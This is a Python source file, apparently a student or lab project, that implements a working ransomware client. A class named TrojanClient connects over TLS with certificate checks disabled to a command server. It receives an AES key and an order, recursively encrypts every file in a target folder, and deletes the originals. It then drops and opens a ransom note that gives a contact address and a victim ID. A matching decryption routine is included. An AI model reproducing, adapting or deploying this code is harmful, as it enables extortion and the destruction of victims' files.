import socket
import ssl
import os
import sys
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import protocol


class SecureSocketClient:
    """מחלקה שאחראית רק על יצירת socket עם TLS"""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.context = ssl._create_unverified_context()

    def connect(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        secure_sock = self.context.wrap_socket(sock, server_hostname="anything")
        secure_sock.connect((self.host, self.port))
        print("[+] Connected to server via SSL.")
        return secure_sock


class FileEncryptor:
    """אחראי על הצפנה ופענוח של קבצים"""

    @staticmethod
    def encrypt_folder(folder_path, aes_key):  #asdasdasdsasad
        for file_name in os.listdir(folder_path):
            full_path = os.path.join(folder_path, file_name)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, "rb") as f:
                        file_data = f.read()

                    iv = get_random_bytes(16)
                    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))

                    with open(full_path + "_", "wb") as f:
                        f.write(iv + encrypted_data)

                    os.remove(full_path)
                except Exception:
                    continue
            elif os.path.isdir(full_path):
                FileEncryptor.encrypt_folder(full_path, aes_key)

    @staticmethod
    def decrypt_folder(folder_path, aes_key): #213213213swdasdas
        for file_name in os.listdir(folder_path):
            full_path = os.path.join(folder_path, file_name)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, "rb") as f:
                        file_data = f.read()

                    iv = file_data[:16]
                    encrypted_data = file_data[16:]
                    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

                    decrypted_path = full_path.rstrip("_")
                    with open(decrypted_path, "wb") as f:
                        f.write(decrypted_data)

                    os.remove(full_path)
                except Exception:
                    continue
            elif os.path.isdir(full_path):
                FileEncryptor.decrypt_folder(full_path, aes_key)


class RansomNote:
    """אחראי על הצגת הודעות לקורבן"""

    @staticmethod
    def show_encrypted(): #sadjasfgahsjsag
        note = """
        🔒 All your files have been encrypted!
        
        To get the key and decrypt your files, contact us.
        Contact: hackers@example.com
        Victim ID: 142739ddd
        """
        with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
            f.write(note)
        os.system("notepad README_DECRYPT.txt")

    @staticmethod
    def show_decrypted():#ashdsajgfsakg
        note = """
        🔓 All your files have been decrypted!
        Your system is restored and your files are back to normal.
        """
        with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
            f.write(note)
        os.system("notepad README_DECRYPT.txt")


class TrojanClient:
    """מחלקה שמבצעת את תקשורת השליטה לפי פרוטוקול"""

    def __init__(self, host, port, folder):
        self.folder = folder
        self.connection = SecureSocketClient(host, port).connect()

    def run(self):
        aes_key = protocol.receive(self.connection)
        action = protocol.receive(self.connection).decode("utf-8")

        if action == "encrypt":
            FileEncryptor.encrypt_folder(self.folder, aes_key)
            del aes_key
            RansomNote.show_encrypted()
            protocol.send(self.connection, "the files are encrypted")

        elif action == "decrypt":
            FileEncryptor.decrypt_folder(self.folder, aes_key)
            del aes_key
            RansomNote.show_decrypted()
            protocol.send(self.connection, "the files are decrypted")

        sys.exit()


if __name__ == "__main__":
    HOST = "127.0.0.1"
    PORT = 44444
    FOLDER = "D:\check"

    client = TrojanClient(HOST, PORT, FOLDER)
    client.run()